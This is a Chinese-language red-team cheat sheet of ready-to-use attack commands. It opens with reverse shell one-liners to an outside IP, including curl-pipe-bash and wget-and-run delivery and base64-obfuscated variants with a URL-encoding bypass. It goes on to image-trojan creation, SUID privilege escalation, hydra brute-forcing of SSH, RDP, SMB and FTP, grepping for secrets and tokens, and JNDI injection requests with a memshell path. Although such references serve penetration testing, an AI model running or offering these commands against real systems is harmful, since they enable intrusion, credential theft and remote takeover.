<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%8F%8D%E5%BC%B9shell"></a>反弹Shell</h2><p>常用反弹shell方式如下（bash&#x2F;curl&#x2F;http），其他反弹shell方式参考：<a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/tips/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md">Click Here</a></p>
<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#bash"></a>bash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1<br></code></pre></td></tr></table></figure>

<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#curl"></a>curl</h3><p>攻击方：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat bash.html/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1<br></code></pre></td></tr></table></figure>

<p>被控端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl 192.168.35.152/bash.html|bash<br></code></pre></td></tr></table></figure>

<h3 id="http"><a href="#http" class="headerlink" title="http"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#http"></a>http</h3><p>攻击方：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">编写shell脚本并启动http服务器</span><br>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1&quot; &gt; shell.shpython2环境下：python -m SimpleHTTPServer 80python3环境下：python -m http.server 80<br></code></pre></td></tr></table></figure>

<p>被控端：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">上传shell.sh文件</span><br>wget 192.168.35.152/shell.sh<br><span class="hljs-meta prompt_"># </span><span class="language-bash">执行shell.sh文件</span><br>bash shell.sh<br></code></pre></td></tr></table></figure>

<h3 id="java"><a href="#java" class="headerlink" title="java"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#java"></a>java</h3><p>java.lang.Runtime.exec() Payload：<a target="_blank" rel="noopener" href="https://www.bugku.net/runtime-exec-payloads/">https://www.bugku.net/runtime-exec-payloads/</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span><br>bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;<br></code></pre></td></tr></table></figure>

<p>URLencode bypass：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span><br>bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;<br></code></pre></td></tr></table></figure>

<h3 id="ssh无记录shell"><a href="#ssh无记录shell" class="headerlink" title="ssh无记录shell"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ssh%E6%97%A0%E8%AE%B0%E5%BD%95shell"></a>ssh无记录shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssh -T root@1.1.1.1 /usr/bin/bash -i<br></code></pre></td></tr></table></figure>

<h3 id="python交互shell"><a href="#python交互shell" class="headerlink" title="python交互shell"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#python%E4%BA%A4%E4%BA%92shell"></a>python交互shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python2 -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure>

<h3 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C"></a>图片马制作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">copy 1.jpg/b+1.php/a 2.jpg<br></code></pre></td></tr></table></figure>

<h2 id="按首字母排序"><a href="#按首字母排序" class="headerlink" title="按首字母排序"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%8C%89%E9%A6%96%E5%AD%97%E6%AF%8D%E6%8E%92%E5%BA%8F"></a>按首字母排序</h2><h3 id="AlliN"><a href="#AlliN" class="headerlink" title="AlliN"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#allin"></a>AlliN</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 按域名爬取<br>python AlliN.py --host $host -m subscan --project $project --timeout 6<br><br># 按文件爬取<br>python AlliN.py -f domain.txt<br></code></pre></td></tr></table></figure>

<h3 id="Arjun"><a href="#Arjun" class="headerlink" title="Arjun"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#arjun"></a>Arjun</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Scan a single URL</span><br>arjun -u https://api.example.com/endpoint<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Specify HTTP method</span><br>arjun -u https://api.example.com/endpoint -m POST<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Import targets</span><br>arjun -i targets.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Export result</span><br>arjun -u https://api.example.com/endpoint -oJ result.json------------------oJ result.json-oT result.txt-oB 127.0.0.1:8080<br></code></pre></td></tr></table></figure>

<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 选项<br>-u 目标<br>-e 文件扩展名<br>-x 排除状态码结果<br>-w 指定字典<br>-r 递归扫描<br>-R 设置递归级别<br>-t 设置线程数（50-100）<br>-c cookie<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 默认字典</span><br>python3 dirsearch.py -u https://target -x <span class="hljs-number">403</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自定义字典</span><br>python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist<br><br><span class="hljs-comment"># -w指定一个字典，若其中的字符串没有后缀，可以通过--suffixes进行添加</span><br>python3 dirsearch.py -u https://target -w /path/to/wordlist --suffixes=.php.bak<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 配置代理</span><br>python3 dirsearch.py -e php,html,js -u https://target --proxy <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span><br><br>python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://<span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 排除404</span><br>python3 dirsearch.py -u https://target -u <span class="hljs-number">404</span><br></code></pre></td></tr></table></figure>

<h3 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#dirmap"></a>dirmap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 单目标</span><br>python dirmap.py -i https://target.com -lcf<br>python dirmap.py -i <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> -lcf<br><br><span class="hljs-comment"># 子网</span><br>python dirmap.py -i <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -lcf<br><br><span class="hljs-comment"># 网络范围</span><br>python dirmap.py -i <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>-<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> -lcf<br><br><span class="hljs-comment"># 文件读取</span><br>python dirmap.py -iF targets.txt -lcf<br></code></pre></td></tr></table></figure>

<h3 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ehole"></a>EHole</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">系统指纹探测</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">本地识别</span><br>EHole -l url.txt   //URL地址需带上协议,每行一个<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">FOFA识别</span><br>EHole -f 192.168.1.1/24  //支持单IP或IP段<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">结果输出</span><br>EHole -l url.txt -json export.json  //结果输出至export.json文件<br></code></pre></td></tr></table></figure>

<h3 id="ENScan-GO"><a href="#ENScan-GO" class="headerlink" title="ENScan_GO"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#enscan_go"></a>ENScan_GO</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">企业信息收集</span><br>ENScanPublic_amd64_linux -n 小米<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">备案信息获取</span><br>ENScanPublic_amd64_linux -n 小米  -field website<br></code></pre></td></tr></table></figure>

<h3 id="find"><a href="#find" class="headerlink" title="find"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看拥有suid权限的文件<br>find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># find结合set权限位提权<br>find /usr/bin/vim -exec &quot;whoami&quot; \;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 全盘查找含有 flag 的文件<br>grep flag -r /<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查找备份压缩包文件<br>find / -name *.tar.gz或find / -name *.zip<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查找包含关键字的文件<br>find /etc -type f | xargs -I &#123;&#125; grep -l server &#123;&#125;<br></code></pre></td></tr></table></figure>

<p>Linux找目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 写文件（www同目录）<br>find /root -name www|while read file;do sh -c &quot;echo $file&quot;&gt;$(dirname $file)/dir.txt;done <br># 写文件（www目录下）<br>find /root -name www|while read file;do sh -c &quot;echo $file&quot;&gt;$file/dir.txt;done <br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 删文件（www同目录）<br>find /root -name www|while read file;do sh -c &quot;rm $(dirname $file)/dir.txt&quot;;done<br># 删文件（www目录下）<br>find /root -name www|while read file;do sh -c &quot;rm $file/dir.txt&quot;;done<br></code></pre></td></tr></table></figure>

<p>Windows找目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 写文件（www同目录）<br>for /f %i in (&#x27;dir /s /b C:\Users\whoami\www.txt&#x27;) do (echo %i &gt; %i\..\dir.txt)<br># 写文件（www目录下）<br>for /f %i in (&#x27;dir /s /b C:\Users\whoami\www&#x27;) do (echo %i &gt; %i\dir.txt)<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 删文件（www同目录）<br>for /f %i in (&#x27;dir /s /b C:\Users\whoami\www.txt&#x27;) do (del %i\..\dir.txt)<br># 删文件（www目录下）<br>for /f %i in (&#x27;dir /s /b C:\Users\whoami\www&#x27;) do (del %i\dir.txt)<br></code></pre></td></tr></table></figure>

<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ffuf"></a>ffuf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ffuf.exe -c -w /path/to/wordlist -u http://ip/FUZZ<br></code></pre></td></tr></table></figure>

<h3 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#fscan"></a>fscan</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># -np跳过存活检测<br>fscan -hf hosts.txt -np --nopoc -t 100<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)<br>fscan.exe -h 192.168.1.1/16 -p 8000-9000 (指定端口扫描)<br>fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)<br></code></pre></td></tr></table></figure>

<p>fscan 默认端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017<br></code></pre></td></tr></table></figure>

<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#grep"></a>grep</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">grep -E &quot;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot; -r / --color=auto<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">grep -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; fold/<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">grep -ohr -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; /app/ |sort|uniq &gt;&gt; test.txt<br></code></pre></td></tr></table></figure>

<h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#hping3"></a>hping3</h3><p>重要端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">21,22,23,53,80,111,389,443,445,512,873,1433,1521,2049,2181,2375,3306,3389,4848,5432,5601,5672,5900,5984,6379,7001,8000-9000,9060,9092,9200,9300,10000,10051,11211.20880,27017,28017,50030,50070<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">8080,8081,8089,8090,8095,8161,8888,8983,9000<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hping3 -S 1.1.1.1 --scan 1-65535<br></code></pre></td></tr></table></figure>

<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#hydra"></a>hydra</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 选项<br>-l 指定的用户名 -L 用户名字典<br>-p 指定密码 -P 密码字典<br>-s 指定端口 <br>-e ns 空密码试探<br>-M 指定目标列表文件，一行一条<br>-o 输出文件<br>-t 任务数默认16<br>-f 爆破成功一个就停止<br>-v 报错日志详细 -V 攻击日志<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hydra -L /root/user.txt -P pass.txt 1.1.1.1 mysql<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hydra -L /root/user.txt -P pass.txt 1.1.1.1 ssh -s 22 -t 4<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hydra -L /root/user.txt -P pass.txt 1.1.1.1 rdp -V<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hydra -L /root/user.txt -P pass.txt 1.1.1.1 smb -vV<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hydra -L /root/user.txt -P pass.txt ftp://1.1.1.1<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 破解SSH<br>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e ns -M IP列表文件 ssh<br><br># 破解RDP<br>hydra -l 用户名 -P 密码字典 -t 线程 -vV -M IP列表文件 rdp<br><br># 破解FTP<br>hydra -l 用户名 -P 密码字典 -t 线程（默认16） -vV IP地址ftp<br></code></pre></td></tr></table></figure>

<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#jndi"></a>JNDI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># https://github.com/welk1n/JNDI-Injection-Exploit<br>GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># https://github.com/WhiteHSBG/JNDIExploit<br>GET /solr/admin/cores?action=$&#123;jndi:ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell3&#125; HTTP/1.1  <br>-------------<br>/ateam  pass1024<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;ls&quot; -A &quot;127.0.0.1&quot;<br><br># java.lang.Runtime.exec() Payload<br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;127.0.0.1&quot;<br></code></pre></td></tr></table></figure>

